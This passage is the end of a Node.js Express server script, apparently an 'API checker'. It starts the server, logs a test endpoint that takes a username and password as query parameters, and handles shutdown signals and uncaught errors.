    });


    app.listen(PORT, () => {
        logger.info(`Express application listening on port ${PORT}`);
        logger.info(`Access API at http://localhost:${PORT} or http://<your-ip>:${PORT}`);
        logger.info(`Test endpoint: GET http://localhost:${PORT}/codm?username=someuser&password=somepass`);
    }).on('error', (err) => {
        logger.error(`Failed to start Express server: ${err.stack || err}`);
        process.exit(1); // Exit if server can't start
    });
}

// Graceful shutdown handling
const signals = {
  'SIGHUP': 1,
  'SIGINT': 2,
  'SIGTERM': 15
};

Object.keys(signals).forEach((signal) => {
  process.on(signal, () => {
    logger.info(`\n--- Received ${signal}, shutting down gracefully ---`);
    // Implement any cleanup here (e.g., closing DB connections, waiting for logs)
    // For now, just log and exit.
    logger.info("--- API Checker Script Stopping ---");
     // Optionally wait for logs to flush
     logger.end ? logger.end() : logger.info("Logger flush not available or needed."); // Winston might handle flush on exit
    process.exit(128 + signals[signal]);
  });
});

process.on('uncaughtException', (err) => {
    logger.error('Uncaught Exception:', err.stack || err);
    // Consider if you should exit or try to recover
    // process.exit(1); // Exit on uncaught exception is often safest
});

process.on('unhandledRejection', (reason, promise) => {
    logger.error('Unhandled Rejection at:', promise, 'reason:', reason.stack || reason);
    // Consider if you should exit or try to recover
    // process.exit(1);
});


// Start the application
startServer();
